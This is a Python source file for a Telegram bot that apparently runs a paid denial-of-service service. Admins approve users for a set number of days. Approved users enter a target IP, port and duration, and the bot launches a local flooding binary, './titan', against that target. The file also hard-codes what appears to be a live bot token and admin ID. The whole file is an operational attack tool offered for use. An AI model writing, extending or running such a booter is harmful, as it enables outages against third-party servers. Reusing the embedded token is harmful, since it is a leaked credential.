import telebot
import logging
import subprocess
import json
import time
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Inbuilt function to set bot token and admin IDs
def set_config():
    global TOKEN, ADMIN_IDS
    TOKEN = "7370501317:AAGiYrhAMJc3khXbzg2-cLJIQBLrKDn4yZk"  # Replace with your bot token
    ADMIN_IDS = [5579438195]    # Replace with your admin IDs as integers

set_config()

bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}

def load_approved_users():
    try:
        with open('users.txt', 'r') as f:
            users = {}
            lines = f.readlines()
            for i in range(0, len(lines), 2):
                user_id = int(lines[i].strip())
                expiry_timestamp = float(lines[i + 1].strip())
                users[user_id] = expiry_timestamp
            return users
    except Exception as e:
        logging.error(f"Error loading approved users: {e}")
        return {}

def is_user_approved(user_id):
    approved_users = load_approved_users()
    return user_id in approved_users and datetime.now().timestamp() < approved_users[user_id]

def run_attack_command_sync(user_id, target_ip, target_port, attack_time):
    try:
        process = subprocess.Popen(["./titan", target_ip, str(target_port), str(attack_time)],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[(user_id, target_ip, target_port)] = process
        bot.send_message(user_id, f"*Attack started on Host: {target_ip}, Port: {target_port} for {attack_time} seconds.*", parse_mode='Markdown')

        time.sleep(attack_time)
        
        stop_attack_manual(user_id, target_ip, target_port)
    except Exception as e:
        logging.error(f"Error in run_attack_command_sync: {e}")
        bot.send_message(user_id, "*Error starting attack.*", parse_mode='Markdown')

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED OR YOUR ACCOUNT HAS EXPIRED.*", parse_mode='Markdown')

def send_main_buttons(chat_id):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton("💣 ATTACK"), 
        KeyboardButton("💥🚀 START ATTACK"), 
        KeyboardButton("🛑 STOP ATTACK")
    )
    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['approve'])
def approve_user(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Use /approve <user_id> <days>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        days = int(cmd_parts[2])
        expiration_date = datetime.now() + timedelta(days=days)
        
        with open('users.txt', 'a') as f:
            f.write(f"{target_user_id}\n{expiration_date.timestamp()}\n")

        bot.send_message(message.chat.id, f"*User {target_user_id} approved for {days} days.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*Error in approving user.*", parse_mode='Markdown')
        logging.error(f"Error in approving user: {e}")

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 2:
            bot.send_message(message.chat.id, "*Invalid command format. Use /disapprove <user_id>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        approved_users = load_approved_users()

        if target_user_id in approved_users:
            del approved_users[target_user_id]
            with open('users.txt', 'w') as f:
                for user_id, expiry in approved_users.items():
                    f.write(f"{user_id}\n{expiry}\n")
            bot.send_message(message.chat.id, f"*User {target_user_id} disapproved successfully.*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, f"*User {target_user_id} is not approved.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*Error in disapproving user.*", parse_mode='Markdown')
        logging.error(f"Error in disapproving user: {e}")

@bot.message_handler(func=lambda message: message.text == "💣 ATTACK")
def attack_button_handler(message):
    if not is_user_approved(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return
    
    bot.send_message(message.chat.id, "*Please provide the target IP, port, and time (in seconds) separated by spaces.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid format. Provide target IP, port, and time (in seconds).*", parse_mode='Markdown')
            return

        target_ip, target_port, attack_time = args[0], int(args[1]), int(args[2])
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port, attack_time)
        bot.send_message(message.chat.id, f"*IP, port, and time saved to the server.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack IP and port: {e}")
        bot.send_message(message.chat.id, "*Something went wrong. Please try again.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "💥🚀 START ATTACK")
def start_attack(message):
    if not is_user_approved(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return
    
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port, attack_time = attack_details
        bot.send_message(message.chat.id, "*Starting attack...*", parse_mode='Markdown')
        run_attack_command_sync(message.from_user.id, target_ip, target_port, attack_time)
    else:
        bot.send_message(message.chat.id, "*No attack details found. Please set IP, port, and time first using the 💣 ATTACK button.*", parse_mode='Markdown')

def stop_attack_manual(user_id, target_ip, target_port):
    try:
        process = active_attacks.pop((user_id, target_ip, target_port), None)
        if process:
            process.terminate()
            bot.send_message(user_id, f"*Attack on Host: {target_ip}, Port: {target_port} has been stopped.*", parse_mode='Markdown')
        else:
            bot.send_message(user_id, "*No active attack found to stop.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error stopping attack: {e}")
        bot.send_message(user_id, "*Error stopping attack.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🛑 STOP ATTACK")
def stop_attack(message):
    if not is_user_approved(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port, attack_time = attack_details
        stop_attack_manual(message.from_user.id, target_ip, target_port)
    else:
        bot.send_message(message.chat.id, "*No active attack found to stop.*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    send_main_buttons(message.chat.id)

# Start the bot polling
if __name__ == "__main__":
    bot.polling(none_stop=True)
